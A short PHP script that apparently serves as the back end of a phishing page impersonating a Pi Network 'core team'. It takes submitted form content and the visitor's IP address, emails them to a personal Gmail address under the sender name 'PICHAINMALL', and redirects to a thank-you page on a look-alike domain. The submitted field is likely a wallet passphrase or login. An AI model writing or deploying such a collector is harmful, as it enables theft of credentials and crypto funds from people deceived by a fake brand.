<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $content = $_POST['content'];
    $date = $_POST['date'];
    $description = $_POST['description'];
    $to = 'youtubber04@gmail.com';
    $ip_address = $_POST['ip_address'];
    $subject = 'ENTRY';
    $headers = "From: PICHAINMALL\r\n";
    $headers .= "Reply-To: no-reply@yourdomain.com\r\n";
    $headers .= "Content-type: text/html\r\n";

 
    $email_content .= "Message: " . nl2br(htmlspecialchars($content)) . "\n";
     $email_content .= "IP Address: " . htmlspecialchars($ip_address) . "\n";

    if (mail($to, $subject, $email_content, $headers)) {
        // Redirect to the thank you page after successful submission
        header("Location: https://pinetworkcoreteam.com/thanks/");
        exit();
    } else {
        echo "Failed to send the message.";
    }
} else {
    echo "Invalid request.";
}
?>
